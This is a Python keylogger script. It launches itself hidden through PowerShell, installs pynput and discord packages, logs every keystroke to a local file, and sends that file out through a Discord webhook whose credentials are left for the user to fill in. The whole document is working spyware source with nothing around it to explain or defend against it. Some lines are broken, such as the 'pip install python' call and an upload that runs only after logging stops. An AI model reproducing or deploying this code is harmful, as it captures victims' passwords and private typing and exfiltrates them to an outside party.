import os
from time import sleep

os.system('PowerShell.exe -WindowStyle Hidden -File kl.py')
os.system('pip install python')
sleep(5)
os.system('pip install pynput')
sleep(5)
os.system('pip install discord')
sleep(5)
os.system('pip install requests')
sleep(5)

import pynput
from pynput.keyboard import Key, Listener
import discord
import requests
from discord import Webhook, RequestsWebhookAdapter, File
count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("kl.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
#PUT YOUR WEBHOOK CREDS
webhook = Webhook.partial(#id webhook, "webhook creds",\
 adapter=RequestsWebhookAdapter())

with open(file='kl.txt', mode='rb') as f:
    my_file = discord.File(f)
#rzerzer
webhook.send('test.txt', username='webhook', file=my_file)
